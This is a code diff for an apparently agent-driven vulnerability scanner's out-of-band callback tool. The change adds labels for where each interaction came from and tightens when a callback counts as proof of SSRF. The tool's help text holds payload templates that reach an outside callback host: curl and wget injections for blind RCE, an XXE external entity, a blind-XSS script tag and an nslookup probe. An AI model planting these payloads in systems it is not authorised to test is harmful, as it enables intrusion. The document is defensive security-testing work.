@@ -1,7 +1,7 @@
 // Package oob registers the out-of-band (OAST) callback tool. It lets the
 // agent mint a unique callback URL, plant it in payloads, and poll for
-// interactions — turning blind SSRF/RCE/XSS/XXE into CONFIRMED findings with
-// concrete evidence (the target's server actually reached our URL).
+// interactions. A callback proves that some system reached the URL; protocol
+// and assessed origin must be considered before attributing it to a target.
 package oob
 
 import (
@@ -17,7 +17,7 @@ import (
 func Register(r *tools.Registry) {
 	r.Register(&tools.Tool{
 		Name:        "oob_callback",
-		Description: "Out-of-band (OAST) callback oracle for CONFIRMING blind vulnerabilities (blind SSRF, blind RCE, blind XSS, XXE, blind SQLi, blind CMDi). Captures DNS, HTTP and SMTP callbacks (via interactsh by default — no server setup needed), so even DNS-only sinks that merely resolve your host are proven. Workflow: (1) action=generate → get a unique callback URL/host; (2) plant it in your payload (an SSRF url param, a command like `curl <url>` or `nslookup <host>`, an XXE SYSTEM entity, a blind-XSS script src); (3) action=poll with the token → any recorded interaction is concrete PROOF the target reached your callback.",
+		Description: "Out-of-band (OAST) callback oracle for investigating blind vulnerabilities (blind SSRF, blind RCE, blind XSS, XXE, blind SQLi, blind CMDi). Workflow: (1) action=generate to mint a callback; (2) plant it in the target-side payload; (3) action=poll with the token. IMPORTANT: an interaction proves only that some system contacted the callback. For SSRF, send the injection request with redirects disabled and require an origin-assessed, non-scanner HTTP interaction. DNS-only, scanner-origin, or origin-unassessed hits are leads, not SSRF proof.",
 		Parameters: []tools.Parameter{
 			{Name: "action", Description: "'generate' to mint a new callback URL (default if omitted), or 'poll' to check for interactions on a token.", Required: false},
 			{Name: "token", Description: "For action=poll: the token returned by generate.", Required: false},
@@ -42,11 +42,13 @@ Callback URL: %s
 Token: %s
 
 Plant the URL in your payload, then poll with this token. Examples:
-- SSRF:      set a url/redirect/webhook param to %s
+- SSRF:      set a url/webhook param to %s and send the INJECTION request with redirects disabled (`+"`curl -sk --max-redirs 0 ...`"+`). A 30x Location pointing here is redirect behavior, NOT SSRF.
 - Blind RCE: inject `+"`curl %s`"+` or `+"`wget %s`"+`
 - XXE:       <!ENTITY x SYSTEM "%s">
 - Blind XSS: <script src=%s></script>
-- DNS-only:  a bare host lookup (e.g. `+"`nslookup %s`"+` or a hostname the target resolves) is also captured and counts as proof.`,
+- DNS-only:  a bare lookup such as `+"`nslookup %s`"+` is captured, but DNS alone is ambiguous and does NOT prove SSRF.
+
+When polling, HTTP interactions are labeled as scanner-origin, origin-unassessed, or assessed non-scanner. Only the last category can support callback-based SSRF verification.`,
 				url, token, url, url, url, url, url, host),
 			Metadata: map[string]any{"oob_url": url, "oob_token": token},
 		}, nil
@@ -61,10 +63,34 @@ Plant the URL in your payload, then poll with this token. Examples:
 			return tools.Result{Output: fmt.Sprintf("No OOB interactions for token %s yet. If you just sent the payload, wait a few seconds and poll again. No callback after several tries = the sink is not reaching us (not blind-exploitable via HTTP egress, or egress is filtered).", token)}, nil
 		}
 		var sb strings.Builder
-		sb.WriteString(fmt.Sprintf("✅ %d OOB interaction(s) for token %s — the target REACHED our callback. This is concrete proof of out-of-band exploitation:\n", len(hits), token))
+		scannerOriginHTTPCount := 0
+		dnsOnlyCount := 0
+		originUnassessedHTTPCount := 0
+		nonScannerHTTPCount := 0
+		calibrated := oobsrv.ScannerOriginCalibrated()
+		sb.WriteString(fmt.Sprintf("⚠️ %d OOB interaction(s) observed for token %s. An interaction alone does NOT identify which system initiated it:\n", len(hits), token))
 		for i, h := range hits {
-			sb.WriteString(fmt.Sprintf("\n[%d] %s %s%s\n    from %s at %s\n    User-Agent: %s\n",
-				i+1, h.Method, h.Path, queryStr(h.Query), h.RemoteAddr, h.Time.Format("2006-01-02T15:04:05Z07:00"), h.UserAgent))
+			protocol := strings.ToLower(strings.TrimSpace(h.Protocol))
+			originLabel := "provenance not applicable to this protocol"
+			switch {
+			case protocol == "dns":
+				originLabel = "DNS-ONLY — AMBIGUOUS"
+				dnsOnlyCount++
+			case protocol == "http" || protocol == "https":
+				switch {
+				case !h.OriginAssessed:
+					originLabel = "ORIGIN UNASSESSED — CALIBRATION PENDING/UNAVAILABLE"
+					originUnassessedHTTPCount++
+				case h.ScannerOrigin:
+					originLabel = "SCANNER ORIGIN — NOT TARGET PROOF"
+					scannerOriginHTTPCount++
+				default:
+					originLabel = "ASSESSED NON-SCANNER HTTP"
+					nonScannerHTTPCount++
+				}
+			}
+			sb.WriteString(fmt.Sprintf("\n[%d] %s %s%s\n    from %s at %s\n    provenance: %s\n    User-Agent: %s\n",
+				i+1, h.Method, h.Path, queryStr(h.Query), h.RemoteAddr, h.Time.Format("2006-01-02T15:04:05Z07:00"), originLabel, h.UserAgent))
 			if len(h.Headers) > 0 {
 				keys := make([]string, 0, len(h.Headers))
 				for k := range h.Headers {
@@ -79,8 +105,30 @@ Plant the URL in your payload, then poll with this token. Examples:
 				sb.WriteString(fmt.Sprintf("    body: %s\n", truncate(h.Body, 500)))
 			}
 		}
-		sb.WriteString("\nUse this (method, source IP, timestamp, headers) as the exploitation_proof in report_vulnerability with verification_method=callback_received.")
-		return tools.Result{Output: sb.String(), Metadata: map[string]any{"oob_hits": len(hits)}}, nil
+		if nonScannerHTTPCount > 0 {
+			sb.WriteString("\nFor SSRF, the assessed non-scanner HTTP interaction can support verification only if the injection request used redirects disabled and a baseline did not produce it. Pass this exact token as oob_token to report_vulnerability.")
+		} else {
+			sb.WriteString("\n❌ No assessed non-scanner HTTP interaction is available; do not report callback-confirmed SSRF.")
+		}
+		if originUnassessedHTTPCount > 0 {
+			sb.WriteString(" Origin calibration is pending or unavailable, so remote HTTP interactions are not attributable and must fail closed.")
+		}
+		if scannerOriginHTTPCount > 0 {
+			sb.WriteString(" Scanner-origin HTTP interactions indicate the scanner followed or directly requested its callback and are not SSRF proof.")
+		}
+		if dnsOnlyCount > 0 {
+			sb.WriteString(" DNS-only interactions may come from the scanner or a recursive resolver and are only leads.")
+		}
+		return tools.Result{Output: sb.String(), Metadata: map[string]any{
+			"oob_hits":                         len(hits),
+			"oob_token":                        token,
+			"scanner_origin_http_hits":         scannerOriginHTTPCount,
+			"dns_only_hits":                    dnsOnlyCount,
+			"origin_unassessed_http_hits":      originUnassessedHTTPCount,
+			"non_scanner_http_hits":            nonScannerHTTPCount,
+			"scanner_origin_calibrated":        calibrated,
+			"scanner_origin_calibration_state": oobsrv.ScannerOriginCalibrationState(),
+		}}, nil
 
 	default:
 		return tools.Result{Output: "❌ Unknown action '" + action + "'. Use 'generate' or 'poll'."}, nil
